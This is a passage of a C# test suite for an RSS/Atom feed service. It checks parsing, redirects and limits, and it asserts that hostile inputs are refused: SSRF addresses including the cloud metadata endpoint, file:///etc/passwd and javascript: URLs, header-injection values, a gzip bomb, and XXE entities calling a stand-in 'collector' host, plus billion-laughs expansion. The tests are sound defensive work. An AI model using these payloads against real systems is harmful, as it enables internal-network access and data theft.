using System.Collections.Concurrent;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Text;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Hosting.Server;
using Microsoft.AspNetCore.Hosting.Server.Features;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using CompanyHQ.Rss.Contracts.Dtos;
using CompanyHQ.Rss.Contracts.Enums;
using CompanyHQ.Rss.Contracts.Ports;
using CompanyHQ.Rss.Extensions;
using CompanyHQ.Rss.Services;
using Xunit;

namespace CompanyHQ.Tests;

/// <summary>
/// The RSS service against a publisher that runs inside the test process. Only the last hop is
/// replaced — where a name resolves and where an approved address really connects — so the
/// address checks, redirects, limits and parsing under test are the production ones, and no
/// request ever leaves this machine.
/// </summary>
public sealed class RssTests(RssFixture publisher) : IClassFixture<RssFixture>
{
    private const string Rss = """
        <?xml version="1.0" encoding="UTF-8"?>
        <rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/"
             xmlns:media="http://search.yahoo.com/mrss/" xmlns:atom="http://www.w3.org/2005/Atom">
          <channel>
            <title>Northwind &amp;amp; Co &lt;b&gt;News&lt;/b&gt;</title>
            <link>https://www.northwind.test/news/</link>
            <atom:link href="https://feeds.northwind.test/rss.xml" rel="self" type="application/rss+xml"/>
            <description>  Company   updates </description>
            <language>en-ZA</language>
            <lastBuildDate>Tue, 03 Jun 2025 09:39:21 GMT</lastBuildDate>
            <image><url>/logo.png</url><title>Northwind</title><link>https://www.northwind.test/</link></image>
            <item>
              <title>Launch &lt;em&gt;day&lt;/em&gt;</title>
              <link>/news/launch?ref=rss</link>
              <guid isPermaLink="false">northwind-1001</guid>
              <description>&lt;p&gt;We &lt;a href="/x"&gt;launched&lt;/a&gt;.&lt;/p&gt;</description>
              <content:encoded><![CDATA[<p>Full <strong>story</strong>.</p><script>alert(1)</script>]]></content:encoded>
              <dc:creator> Thandi Nkosi </dc:creator>
              <author>ignored@northwind.test (Ignored)</author>
              <pubDate>Mon, 02 Jun 2025 18:05:00 +0200</pubDate>
              <enclosure url="https://cdn.northwind.test/ep1.mp3" type="audio/mpeg" length="12345"/>
              <media:thumbnail url="/thumbs/1.jpg"/>
              <media:group><media:content url="https://cdn.northwind.test/ep1.mp4" type="video/mp4" fileSize="999"/></media:group>
              <category>Product</category><category> Product </category><dc:subject>Launches</dc:subject>
            </item>
            <item>
              <title>Plain</title>
              <guid>https://www.northwind.test/news/plain</guid>
              <description>No markup here</description>
              <pubDate>Wed, 04 Jun 2025 07:00:00 EST</pubDate>
            </item>
            <item>
              <link>javascript:alert(document.cookie)</link>
              <guid isPermaLink="true">javascript:alert(1)</guid>
              <pubDate>the day before yesterday</pubDate>
              <enclosure url="file:///etc/passwd" type="text/plain"/>
            </item>
          </channel>
        </rss>
        """;

    private const string Atom = """
        <?xml version="1.0" encoding="utf-8"?>
        <feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" xml:lang="en" xml:base="https://blog.contoso.test/posts/">
          <title type="html">Contoso &lt;i&gt;Engineering&lt;/i&gt;</title>
          <subtitle>How we build</subtitle>
          <link rel="self" href="https://feeds.contoso.test/atom.xml"/>
          <link href="../" type="text/html"/>
          <updated>2025-06-03T09:39:21Z</updated>
          <logo>../logo.svg</logo>
          <author><name>Contoso Team</name></author>
          <entry xml:base="2025/">
            <id>tag:contoso.test,2025:post-7</id>
            <title>Caching, part 7</title>
            <link rel="alternate" type="application/json" href="caching-7.json"/>
            <link rel="alternate" type="text/html" href="caching-7"/>
            <link rel="enclosure" type="audio/mpeg" length="4096" href="caching-7.mp3"/>
            <media:thumbnail url="caching-7.png"/>
            <published>2025-06-01T08:00:00+02:00</published>
            <updated>2025-06-02T10:30:00.5Z</updated>
            <author><name>Sipho Dlamini</name><email>sipho@contoso.test</email></author>
            <summary>Short &amp; plain</summary>
            <content type="xhtml"><div xmlns="http://www.w3.org/1999/xhtml"><p>Body <b>text</b></p></div></content>
            <category term="caching"/><category term="redis" label="Redis"/>
          </entry>
          <entry>
            <id>tag:contoso.test,2025:post-6</id>
            <title type="text">1 &lt; 2</title>
            <link href="older"/>
            <updated>2025-05-01T00:00:00Z</updated>
            <content type="html">&lt;p&gt;Escaped markup&lt;/p&gt;</content>
          </entry>
          <entry><id>tag:contoso.test,2025:post-5</id><content type="image/png" src="https://blog.contoso.test/5.png"/></entry>
        </feed>
        """;

    private const string Page = """
        <!DOCTYPE html>
        <html lang="en-GB">
        <head>
          <meta charset="utf-8">
          <title>  Fabrikam &amp; Sons — Home </title>
          <!-- <link rel="alternate" type="application/rss+xml" href="/commented-out.xml"> -->
          <script>var s = '<link rel="alternate" type="application/rss+xml" href="/in-script.xml">';</script>
          <meta property="og:site_name" content="Fabrikam &amp; Sons">
          <meta name=description content='Hand-made furniture'>
          <link rel="stylesheet" href="/site.css">
          <link rel="shortcut icon" href="/favicon.ico">
          <link rel="alternate" hreflang="af" href="/af/">
          <link rel="alternate" type="application/rss+xml" title="All posts" href="feed.xml">
          <link REL="Alternate" TYPE="application/atom+xml; charset=utf-8" href="/atom.xml">
          <link rel="alternate" type="application/rss+xml" href="feed.xml">
          <link rel="alternate" type="application/rss+xml" href="javascript:alert(1)">
          <link rel="alternate stylesheet" type="application/rss+xml" href="/not-a-feed.xml">
          <link rel="alternate" type="application/rss+xml" href="//feeds.fabrikam.test/news.xml">
          <base href="/blog/">
        </head>
        <body><link rel="alternate" type="application/rss+xml" href="/in-body.xml"></body>
        </html>
        """;

    [Fact]
    public async Task Rss_IsReadIntoPlainTextAbsoluteUrlsAndMarkedMarkup()
    {
        publisher.Serve("feeds.northwind.test", "/rss.xml", context =>
        {
            context.Response.Headers.ETag = "\"v1\"";
            context.Response.Headers.LastModified = "Tue, 03 Jun 2025 09:39:21 GMT";
            return context.Send(Rss, "application/rss+xml; charset=utf-8");
        });
        await using var host = publisher.Compose();

        var result = await host.Rss.FetchAsync(new("http://feeds.northwind.test/rss.xml#latest"));

        Assert.Equal((FeedFetchStatus.Changed, "http://feeds.northwind.test/rss.xml", false, null), (result.Status, result.FinalUrl, result.MovedPermanently, result.Error));
        Assert.Equal(new FeedValidatorsDto("\"v1\"", "Tue, 03 Jun 2025 09:39:21 GMT"), result.Validators);
        var feed = result.Feed!;
        Assert.Equal(
            (FeedFormat.Rss, "Northwind & Co News", "Company updates", "https://www.northwind.test/news/", "en-ZA", "https://www.northwind.test/logo.png", false),
            (feed.Format, feed.Title, feed.Description, feed.SiteUrl, feed.Language, feed.ImageUrl, feed.Truncated));
        Assert.Equal(new DateTimeOffset(2025, 6, 3, 9, 39, 21, TimeSpan.Zero), feed.UpdatedAt);

        var launch = feed.Items[0];
        Assert.Equal(("northwind-1001", "https://www.northwind.test/news/launch?ref=rss", "Launch day", "Thandi Nkosi"), (launch.Id, launch.Url, launch.Title, launch.Author));
        // Markup is handed over exactly as the publisher wrote it, and labelled as untrusted markup.
        Assert.Equal(new FeedContentDto("<p>We <a href=\"/x\">launched</a>.</p>", FeedContentType.Html), launch.Summary);
        Assert.Equal(new FeedContentDto("<p>Full <strong>story</strong>.</p><script>alert(1)</script>", FeedContentType.Html), launch.Content);
        Assert.Equal(new DateTimeOffset(2025, 6, 2, 18, 5, 0, TimeSpan.FromHours(2)), launch.PublishedAt);
        Assert.Equal(
        [
            new FeedMediaDto("https://cdn.northwind.test/ep1.mp3", FeedMediaKind.Enclosure, "audio/mpeg", 12345),
            new FeedMediaDto("https://www.northwind.test/thumbs/1.jpg", FeedMediaKind.Thumbnail),
            new FeedMediaDto("https://cdn.northwind.test/ep1.mp4", FeedMediaKind.Enclosure, "video/mp4", 999),
        ], launch.Media);
        Assert.Equal(["Product", "Launches"], launch.Categories);

        var plain = feed.Items[1];
        Assert.Equal(("https://www.northwind.test/news/plain", "https://www.northwind.test/news/plain"), (plain.Id, plain.Url));
        Assert.Equal(new FeedContentDto("No markup here", FeedContentType.Text), plain.Summary);
        Assert.Equal(new DateTimeOffset(2025, 6, 4, 7, 0, 0, TimeSpan.FromHours(-5)), plain.PublishedAt);

        // A link that is not http(s) is never handed on as a link, and an unreadable date is no date.
        var hostile = feed.Items[2];
        Assert.Equal((null, null, null, 0), (hostile.Url, hostile.Title, hostile.PublishedAt, hostile.Media.Count));
        Assert.Equal("javascript:alert(1)", hostile.Id);

        var sent = Assert.Single(publisher.Received("feeds.northwind.test"));
        Assert.Equal(("/rss.xml", "CompanyHQ-Rss/1.0", "gzip, deflate, br", ""), (sent.Path, sent.UserAgent, sent.AcceptEncoding, sent.Cookie));
        Assert.Equal((null, null), (sent.IfNoneMatch, sent.IfModifiedSince));
    }

    [Fact]
    public async Task Atom_ResolvesAgainstXmlBase_AndKeepsTextMarkupAndForeignContentApart()
    {
        publisher.Serve("feeds.contoso.test", "/atom.xml", context => context.Send(Atom, "application/atom+xml"));
        await using var host = publisher.Compose();

        var feed = (await host.Rss.FetchAsync(new("http://feeds.contoso.test/atom.xml"))).Feed!;

        Assert.Equal(
            (FeedFormat.Atom, "Contoso Engineering", "How we build", "https://blog.contoso.test/", "en", "https://blog.contoso.test/logo.svg"),
            (feed.Format, feed.Title, feed.Description, feed.SiteUrl, feed.Language, feed.ImageUrl));
        Assert.Equal(new DateTimeOffset(2025, 6, 3, 9, 39, 21, TimeSpan.Zero), feed.UpdatedAt);

        var entry = feed.Items[0];
        Assert.Equal(("tag:contoso.test,2025:post-7", "https://blog.contoso.test/posts/2025/caching-7", "Caching, part 7", "Sipho Dlamini"), (entry.Id, entry.Url, entry.Title, entry.Author));
        Assert.Equal(new FeedContentDto("Short & plain", FeedContentType.Text), entry.Summary);
        Assert.Equal(new FeedContentDto("<p xmlns=\"http://www.w3.org/1999/xhtml\">Body <b>text</b></p>", FeedContentType.Html), entry.Content);
        Assert.Equal(new DateTimeOffset(2025, 6, 1, 8, 0, 0, TimeSpan.FromHours(2)), entry.PublishedAt);
        Assert.Equal(new DateTimeOffset(2025, 6, 2, 10, 30, 0, 500, TimeSpan.Zero), entry.UpdatedAt);
        Assert.Equal(
        [
            new FeedMediaDto("https://blog.contoso.test/posts/2025/caching-7.mp3", FeedMediaKind.Enclosure, "audio/mpeg", 4096),
            new FeedMediaDto("https://blog.contoso.test/posts/2025/caching-7.png", FeedMediaKind.Thumbnail),
        ], entry.Media);
        Assert.Equal(["caching", "redis"], entry.Categories);

        var older = feed.Items[1];
        Assert.Equal(("1 < 2", "https://blog.contoso.test/posts/older", "Contoso Team"), (older.Title, older.Url, older.Author));
        Assert.Equal(new FeedContentDto("<p>Escaped markup</p>", FeedContentType.Html), older.Content);
        // Content that is a file or lives elsewhere is not text, so it is not passed off as text.
        Assert.Null(feed.Items[2].Content);
    }

    [Fact]
    public async Task UnchangedEmptyAndFailed_AreThreeDifferentAnswers()
    {
        var version = "\"v2\"";
        publisher.Serve("feeds.status.test", "/feed", context =>
        {
            if (context.Request.Headers.IfNoneMatch == version)
            {
                context.Response.StatusCode = 304;
                context.Response.Headers.ETag = version;
                return Task.CompletedTask;
            }

            context.Response.Headers.ETag = version;
            return context.Send("""<rss version="2.0"><channel><title>Quiet</title></channel></rss>""", "text/xml");
        });
        publisher.Serve("feeds.status.test", "/gone", context => context.Status(404));
        publisher.Serve("feeds.status.test", "/busy", context => context.Status(503));
        publisher.Serve("feeds.status.test", "/confused", context => context.Status(304));
        await using var host = publisher.Compose();

        // Empty: the publisher answered, and there is nothing in it. That replaces what a caller held.
        var empty = await host.Rss.FetchAsync(new("http://feeds.status.test/feed"));
        Assert.Equal((FeedFetchStatus.Changed, 0, "Quiet"), (empty.Status, empty.Feed!.Items.Count, empty.Feed.Title));
        Assert.Equal(new FeedValidatorsDto("\"v2\""), empty.Validators);

        // Unchanged: no document at all, and the validators to keep using.
        var unchanged = await host.Rss.FetchAsync(new("http://feeds.status.test/feed", empty.Validators));
        Assert.Equal((FeedFetchStatus.NotModified, null, null), (unchanged.Status, unchanged.Feed, unchanged.Error));
        Assert.Equal(empty.Validators, unchanged.Validators);
        Assert.Equal("\"v2\"", publisher.Received("feeds.status.test").Last().IfNoneMatch);

        // A stale validator simply gets the document again.
        version = "\"v3\"";
        var changed = await host.Rss.FetchAsync(new("http://feeds.status.test/feed", new("\"v2\"", "Mon, 02 Jun 2025 00:00:00 GMT")));
        Assert.Equal((FeedFetchStatus.Changed, new FeedValidatorsDto("\"v3\"")), (changed.Status, changed.Validators));
        Assert.Equal("Mon, 02 Jun 2025 00:00:00 GMT", publisher.Received("feeds.status.test").Last().IfModifiedSince);

        // Failed: nothing is known, the caller's validators come back untouched, and the code says whether to retry.
        var held = new FeedValidatorsDto("\"kept\"", "Sun, 01 Jun 2025 00:00:00 GMT");
        var gone = await host.Rss.FetchAsync(new("http://feeds.status.test/gone", held));
        Assert.Equal((FeedFetchStatus.Failed, null, held), (gone.Status, gone.Feed, gone.Validators));
        Assert.Equal(new FeedErrorDto(FeedErrorCode.HttpStatus, "The publisher answered with an error status.", 404, false), gone.Error);
        var busy = await host.Rss.FetchAsync(new("http://feeds.status.test/busy"));
        Assert.Equal((FeedErrorCode.HttpStatus, 503, true), (busy.Error!.Code, busy.Error.HttpStatus, busy.Error.Transient));

        // "Not modified" to a question nobody asked is a broken publisher, not an unchanged feed.
        Assert.Equal(FeedErrorCode.InvalidResponse, (await host.Rss.FetchAsync(new("http://feeds.status.test/confused"))).Error!.Code);
        // A validator that could smuggle a header is dropped, never sent.
        await host.Rss.FetchAsync(new("http://feeds.status.test/feed", new("\"x\"\r\nX-Injected: 1", "bad\nvalue")));
        Assert.Equal((null, null), (publisher.Received("feeds.status.test").Last().IfNoneMatch, publisher.Received("feeds.status.test").Last().IfModifiedSince));
    }

    [Fact]
    public async Task Redirects_AreFollowedOneCheckedHopAtATime()
    {
        publisher.Serve("old.moved.test", "/feed", context => context.Redirect(301, "http://www.moved.test/rss"));
        publisher.Serve("www.moved.test", "/rss", context => context.Redirect(308, "/feeds/main.xml?x=1"));
        publisher.Serve("www.moved.test", "/feeds/main.xml", context => context.Send("""<rss version="2.0"><channel><title>Moved</title></channel></rss>""", "text/xml"));
        publisher.Serve("www.moved.test", "/temporary", context => context.Redirect(302, "/feeds/main.xml"));
        publisher.Serve("www.moved.test", "/loop", context => context.Redirect(302, "/loop"));
        publisher.Serve("www.moved.test", "/nowhere", context => context.Status(302));
        publisher.Serve("www.moved.test", "/to-loopback", context => context.Redirect(302, "http://127.0.0.1/admin"));
        publisher.Serve("www.moved.test", "/to-metadata", context => context.Redirect(307, "http://169.254.169.254/latest/meta-data/"));
        publisher.Serve("www.moved.test", "/to-internal-name", context => context.Redirect(302, "http://intranet.moved.test/feed"));
        publisher.Serve("www.moved.test", "/to-file", context => context.Redirect(302, "file:///etc/passwd"));
        publisher.Serve("www.moved.test", "/to-port", context => context.Redirect(302, "http://www.moved.test:6379/"));
        publisher.Serve("www.moved.test", "/to-credentials", context => context.Redirect(302, "http://admin:secret@www.moved.test/feeds/main.xml"));
        publisher.Resolve("intranet.moved.test", "10.20.30.40");
        await using var host = publisher.Compose();

        var moved = await host.Rss.FetchAsync(new("http://old.moved.test/feed"));
        Assert.Equal((FeedFetchStatus.Changed, "http://www.moved.test/feeds/main.xml?x=1", true), (moved.Status, moved.FinalUrl, moved.MovedPermanently));
        // One temporary hop means the caller keeps the address it has.
        Assert.False((await host.Rss.FetchAsync(new("http://www.moved.test/temporary"))).MovedPermanently);

        Assert.Equal(FeedErrorCode.TooManyRedirects, (await host.Rss.FetchAsync(new("http://www.moved.test/loop"))).Error!.Code);
        Assert.Equal(6, publisher.Received("www.moved.test").Count(request => request.Path == "/loop"));
        Assert.Equal(FeedErrorCode.InvalidResponse, (await host.Rss.FetchAsync(new("http://www.moved.test/nowhere"))).Error!.Code);

        publisher.Connections.Clear();
        foreach (var (path, code) in new[]
        {
            ("/to-loopback", FeedErrorCode.UnsafeAddress),
            ("/to-metadata", FeedErrorCode.UnsafeAddress),
            ("/to-internal-name", FeedErrorCode.UnsafeAddress),
            ("/to-file", FeedErrorCode.UnsafeRedirect),
            ("/to-port", FeedErrorCode.UnsafeRedirect),
            ("/to-credentials", FeedErrorCode.UnsafeRedirect),
        })
        {
            var refused = await host.Rss.FetchAsync(new("http://www.moved.test" + path));
            Assert.Equal((path, FeedFetchStatus.Failed, code, false), (path, refused.Status, refused.Error!.Code, refused.Error.Transient));
        }

        // Whatever a publisher redirects to, a socket is only ever opened to its own public address.
        Assert.All(publisher.Connections, endpoint => Assert.Equal(RssFixture.PublicAddress, endpoint.Address));

        await using var strict = publisher.Compose(("Rss:MaxRedirects", "0"));
        Assert.Equal(FeedErrorCode.TooManyRedirects, (await strict.Rss.FetchAsync(new("http://old.moved.test/feed"))).Error!.Code);
    }

    [Theory]
    [InlineData("http://127.0.0.1/feed")]
    [InlineData("http://127.1/feed")]
    [InlineData("http://2130706433/feed")]
    [InlineData("http://0x7f000001/feed")]
    [InlineData("http://0177.0.0.1/feed")]
    [InlineData("http://localhost/feed")]
    [InlineData("http://LOCALHOST./feed")]
    [InlineData("http://app.localhost/feed")]
    [InlineData("http://0.0.0.0/feed")]
    [InlineData("http://10.0.0.1/feed")]
    [InlineData("http://172.16.0.1/feed")]
    [InlineData("http://172.31.255.254/feed")]
    [InlineData("http://192.168.1.1/feed")]
    [InlineData("http://169.254.169.254/latest/meta-data/")]
    [InlineData("http://100.64.0.1/feed")]
    [InlineData("http://192.0.2.10/feed")]
    [InlineData("http://198.18.0.1/feed")]
    [InlineData("http://224.0.0.1/feed")]
    [InlineData("http://255.255.255.255/feed")]
    [InlineData("http://[::1]/feed")]
    [InlineData("http://[::]/feed")]
    [InlineData("http://[::ffff:127.0.0.1]/feed")]
    [InlineData("http://[::ffff:10.0.0.1]/feed")]
    [InlineData("http://[::7f00:1]/feed")]
    [InlineData("http://[fc00::1]/feed")]
    [InlineData("http://[fd12:3456::1]/feed")]
    [InlineData("http://[fe80::1]/feed")]
    [InlineData("http://[ff02::1]/feed")]
    [InlineData("http://[64:ff9b::7f00:1]/feed")]
    [InlineData("http://[2002:c0a8:101::1]/feed")]
    [InlineData("http://[2001:db8::1]/feed")]
    [InlineData("http://[2001::1]/feed")]
    [InlineData("http://[3fff::1]/feed")]
    [InlineData("http://[3fff:fff::1]/feed")]
    [InlineData("http://[2001:20::1]/feed")]
    public async Task AnAddressThatIsNotOnThePublicInternet_IsRefusedBeforeAnySocketIsOpened(string url)
    {
        await using var host = publisher.Compose();
        var before = publisher.Connections.Count;

        var fetched = await host.Rss.FetchAsync(new(url));
        var discovered = await host.Rss.DiscoverAsync(new(url));

        Assert.Equal((FeedFetchStatus.Failed, FeedErrorCode.UnsafeAddress, false), (fetched.Status, fetched.Error!.Code, fetched.Error.Transient));
        Assert.Equal((FeedDiscoveryStatus.Failed, FeedErrorCode.UnsafeAddress), (discovered.Status, discovered.Error!.Code));
        Assert.Equal("The address is not on the public internet.", fetched.Error.Message);
        Assert.Equal(before, publisher.Connections.Count);
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("feeds.example.test/rss.xml")]
    [InlineData("//feeds.example.test/rss.xml")]
    [InlineData("/rss.xml")]
    [InlineData("ftp://feeds.example.test/rss.xml")]
    [InlineData("file:///etc/passwd")]
    [InlineData("gopher://feeds.example.test:70/")]
    [InlineData("javascript:alert(1)")]
    [InlineData("data:text/xml,<rss/>")]
    [InlineData("http://user:pass@feeds.example.test/rss.xml")]
    [InlineData("http://feeds.example.test:8080/rss.xml")]
    [InlineData("http://feeds.example.test:22/")]
    public async Task AnAddressThatIsNotAPlainWebAddress_IsRefusedWithoutResolvingAnything(string url)
    {
        publisher.Resolve("feeds.example.test", RssFixture.PublicAddress.ToString());
        await using var host = publisher.Compose();
        var (connections, lookups) = (publisher.Connections.Count, publisher.Lookups.Count);

        Assert.Equal(FeedErrorCode.InvalidUrl, (await host.Rss.FetchAsync(new(url))).Error!.Code);
        Assert.Equal(FeedErrorCode.InvalidUrl, (await host.Rss.DiscoverAsync(new(url))).Error!.Code);
        Assert.Equal((connections, lookups), (publisher.Connections.Count, publisher.Lookups.Count));
    }

    [Theory]
    [InlineData("logo")]
    [InlineData("icon")]
    public async Task AtomPublisherImageUsesItsOwnXmlBase(string element)
    {
        var xml = $"<feed xmlns='http://www.w3.org/2005/Atom' xml:base='https://example.test/posts/'><{element} xml:base='../images/'>publisher.svg</{element}></feed>";
        publisher.Serve("image.elements.test", "/feed", context => context.Send(xml, "application/atom+xml"));
        await using var host = publisher.Compose();
        var result = await host.Rss.FetchAsync(new("http://image.elements.test/feed"));
        Assert.Equal(FeedFetchStatus.Changed, result.Status);
        Assert.Equal("https://example.test/images/publisher.svg", result.Feed!.ImageUrl);
    }

    [Theory]
    [InlineData("<feed xmlns='http://www.w3.org/2005/Atom' xml:base='https://example.test/posts/'><entry><link rel='enclosure' xml:base='../media/' href='episode.mp3'/><m:group xmlns:m='http://search.yahoo.com/mrss/' xml:base='../images/'><m:thumbnail xml:base='small/' url='one.png'/></m:group></entry></feed>")]
    [InlineData("<rss xml:base='https://example.test/posts/' xmlns:m='http://search.yahoo.com/mrss/'><channel><item><enclosure xml:base='../media/' url='episode.mp3'/><m:group xml:base='../images/'><m:thumbnail xml:base='small/' url='one.png'/></m:group></item></channel></rss>")]
    public async Task MediaUsesEveryElementXmlBase(string xml)
    {
        publisher.Serve("base.elements.test", "/feed", context => context.Send(xml, "text/xml"));
        await using var host = publisher.Compose();
        var result = await host.Rss.FetchAsync(new("http://base.elements.test/feed"));
        Assert.Equal(FeedFetchStatus.Changed, result.Status);
        Assert.Equal(new[] { "https://example.test/media/episode.mp3", "https://example.test/images/small/one.png" },
            Assert.Single(result.Feed!.Items).Media.Select(media => media.Url));
    }

    [Fact]
    public async Task ANameIsJudgedByEveryAddressItResolvesTo_AtTheMomentOfConnecting()
    {
        publisher.Serve("feeds.rebind.test", "/feed", context =>
        {
            // Closing the connection forces the next fetch to resolve and connect afresh.
            context.Response.Headers.Connection = "close";
            return context.Send("""<rss version="2.0"><channel><title>Rebind</title></channel></rss>""", "text/xml");
        });
        publisher.Resolve("private.rebind.test", "192.168.10.10");
        publisher.Resolve("mixed.rebind.test", RssFixture.PublicAddress.ToString(), "10.0.0.7");
        publisher.Resolve("mapped.rebind.test", "::ffff:169.254.169.254");
        publisher.Resolve("six.rebind.test", "fd00::10");
        publisher.Resolve("documentation.rebind.test", "3fff::1");
        publisher.Resolve("orchid.rebind.test", "2001:20::1");
        var answers = new Queue<string>(["93.184.216.34", "127.0.0.1", "93.184.216.34"]);
        publisher.Resolve("feeds.rebind.test", () => [IPAddress.Parse(answers.Dequeue())]);
        await using var host = publisher.Compose();
        publisher.Connections.Clear();

        foreach (var name in new[] { "private", "mixed", "mapped", "six", "documentation", "orchid" })
        {
            var refused = await host.Rss.FetchAsync(new($"http://{name}.rebind.test/feed"));
            Assert.Equal((name, FeedErrorCode.UnsafeAddress), (name, refused.Error!.Code));
        }

        // A name nobody knows is unreachable, which is worth retrying; an internal one never is.
        var unknown = await host.Rss.FetchAsync(new("http://nxdomain.rebind.test/feed"));
        Assert.Equal((FeedErrorCode.Unreachable, true), (unknown.Error!.Code, unknown.Error.Transient));
        Assert.Empty(publisher.Connections);

        // Rebinding: public when first asked, this machine when asked again. The second answer is
        // the one that would be connected to, so it is the one that is judged.
        Assert.Equal(FeedFetchStatus.Changed, (await host.Rss.FetchAsync(new("http://feeds.rebind.test/feed"))).Status);
        Assert.Equal(FeedErrorCode.UnsafeAddress, (await host.Rss.FetchAsync(new("http://feeds.rebind.test/feed"))).Error!.Code);
        Assert.Equal(FeedFetchStatus.Changed, (await host.Rss.FetchAsync(new("http://feeds.rebind.test/feed"))).Status);
        Assert.Equal([new IPEndPoint(IPAddress.Parse("93.184.216.34"), 80), new IPEndPoint(IPAddress.Parse("93.184.216.34"), 80)], publisher.Connections);
    }

    [Fact]
    public async Task APublisherCannotCostMoreBytesOrTimeThanConfigured()
    {
        var item = "<item><title>" + new string('x', 200) + "</title></item>";
        var big = "<rss version=\"2.0\"><channel><title>Big</title>" + string.Concat(Enumerable.Repeat(item, 400)) + "</channel></rss>";
        var bomb = "<rss version=\"2.0\"><channel><title>" + new string(' ', 8 * 1024 * 1024) + "</title></channel></rss>";
        var small = """<rss version="2.0"><channel><title>Compressed</title><item><title>One</title></item></channel></rss>""";
        publisher.Serve("feeds.limits.test", "/declared", context => context.Send(big, "text/xml"));
        publisher.Serve("feeds.limits.test", "/chunked", async context =>
        {
            context.Response.ContentType = "text/xml";
            foreach (var chunk in Encoding.UTF8.GetBytes(big).Chunk(4096)) await context.Response.Body.WriteAsync(chunk);
        });
        publisher.Serve("feeds.limits.test", "/bomb", context => context.SendEncoded(RssFixture.Gzip(bomb), "gzip"));
        publisher.Serve("feeds.limits.test", "/gzip", context => context.SendEncoded(RssFixture.Gzip(small), "gzip"));
        publisher.Serve("feeds.limits.test", "/brotli", context => context.SendEncoded(RssFixture.Brotli(small), "br"));
        publisher.Serve("feeds.limits.test", "/zlib", context => context.SendEncoded(RssFixture.Zlib(small), "deflate"));
        publisher.Serve("feeds.limits.test", "/raw-deflate", context => context.SendEncoded(RssFixture.Deflate(small), "deflate"));
        publisher.Serve("feeds.limits.test", "/corrupt", context => context.SendEncoded(Encoding.UTF8.GetBytes(small), "gzip"));
        publisher.Serve("feeds.limits.test", "/unknown-encoding", context => context.SendEncoded(Encoding.UTF8.GetBytes(small), "zstd"));
        publisher.Serve("feeds.limits.test", "/slow", async context =>
        {
            await Task.Delay(TimeSpan.FromSeconds(20), context.RequestAborted);
            await context.Send(small, "text/xml");
        });
        publisher.Serve("feeds.limits.test", "/drip", async context =>
        {
            context.Response.ContentType = "text/xml";
            await context.Response.WriteAsync("<rss version=\"2.0\"><channel>", context.RequestAborted);
            await context.Response.Body.FlushAsync(context.RequestAborted);
            await Task.Delay(TimeSpan.FromSeconds(20), context.RequestAborted);
        });
        await using var host = publisher.Compose(("Rss:MaxFeedBytes", "65536"), ("Rss:TimeoutSeconds", "1"), ("Rss:MaxItems", "3"));

        Assert.True(Encoding.UTF8.GetByteCount(big) > 65536 && RssFixture.Gzip(bomb).Length < 65536);
        foreach (var path in new[] { "/declared", "/chunked", "/bomb" })
        {
            var refused = await host.Rss.FetchAsync(new("http://feeds.limits.test" + path));
            Assert.Equal((path, FeedErrorCode.ResponseTooLarge, false), (path, refused.Error!.Code, refused.Error.Transient));
        }

        foreach (var path in new[] { "/gzip", "/brotli", "/zlib", "/raw-deflate" })
        {
            var read = await host.Rss.FetchAsync(new("http://feeds.limits.test" + path));
            Assert.Equal((path, FeedFetchStatus.Changed, "Compressed"), (path, read.Status, read.Feed?.Title));
        }

        Assert.Equal(FeedErrorCode.InvalidResponse, (await host.Rss.FetchAsync(new("http://feeds.limits.test/corrupt"))).Error!.Code);
        Assert.Equal(FeedErrorCode.InvalidResponse, (await host.Rss.FetchAsync(new("http://feeds.limits.test/unknown-encoding"))).Error!.Code);

        // The budget covers the whole exchange: the headers, and a body that never finishes.
        foreach (var path in new[] { "/slow", "/drip" })
        {
            var started = Environment.TickCount64;
            var late = await host.Rss.FetchAsync(new("http://feeds.limits.test" + path));
            Assert.Equal((path, FeedErrorCode.Timeout, true), (path, late.Error!.Code, late.Error.Transient));
            Assert.InRange(Environment.TickCount64 - started, 800, 6_000);
        }

        // The caller's own cancellation is the caller's, and is not reported as a publisher failure.
        using var cancelled = new CancellationTokenSource(TimeSpan.FromMilliseconds(100));
        await Assert.ThrowsAnyAsync<OperationCanceledException>(() => host.Rss.FetchAsync(new("http://feeds.limits.test/slow"), cancelled.Token));

        // A long feed inside the byte limit is cut at the item limit and says so.
        await using var roomy = publisher.Compose(("Rss:MaxItems", "3"));
        var cut = (await roomy.Rss.FetchAsync(new("http://feeds.limits.test/declared"))).Feed!;
        Assert.Equal((3, true), (cut.Items.Count, cut.Truncated));
    }

    [Fact]
    public async Task ADocumentCannotMakeTheParserExpandOrFetchAnything()
    {
        var served = new Dictionary<string, string>
        {
            ["/xxe-file"] = """<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><rss version="2.0"><channel><title>&xxe;</title></channel></rss>""",
            ["/xxe-http"] = """<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM "http://collector.xml.test/steal">]><rss version="2.0"><channel><title>&xxe;</title></channel></rss>""",
            ["/external-dtd"] = """<?xml version="1.0"?><!DOCTYPE rss SYSTEM "http://collector.xml.test/evil.dtd"><rss version="2.0"><channel><title>x</title></channel></rss>""",
            ["/parameter-entity"] = """<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY % remote SYSTEM "http://collector.xml.test/p.dtd"> %remote;]><rss version="2.0"><channel/></rss>""",
            ["/laughs"] = """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "lol"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">]><rss version="2.0"><channel><title>&d;</title></channel></rss>""",
            ["/legacy-doctype"] = """<?xml version="1.0"?><!DOCTYPE rss PUBLIC "-//Netscape Communications//DTD RSS 0.91//EN" "http://my.netscape.com/publish/formats/rss-0.91.dtd"><rss version="0.91"><channel><title>Old</title></channel></rss>""",
            ["/undeclared-entity"] = """<rss version="2.0"><channel><title>Caf&eacute;</title></channel></rss>""",
